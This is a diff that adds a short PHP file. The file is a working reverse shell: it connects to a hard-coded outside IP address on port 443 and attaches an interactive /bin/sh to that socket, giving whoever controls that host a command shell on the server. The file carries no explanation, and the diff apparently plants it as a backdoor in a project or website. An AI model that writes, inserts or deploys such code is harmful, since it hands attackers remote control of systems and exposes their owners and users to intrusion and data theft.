@@ -1,0 +1,16 @@
+<?php
+$ip = "5.104.86.216";
+$port = 443;
+
+$socket = fsockopen($ip, $port);
+
+if ($socket) {
+$descriptorspec = array(
+0 => $socket, 
+1 => $socket, 
+2 => $socket 
+);
+
+proc_open("/bin/sh -i", $descriptorspec, $pipes);
+}
+?>
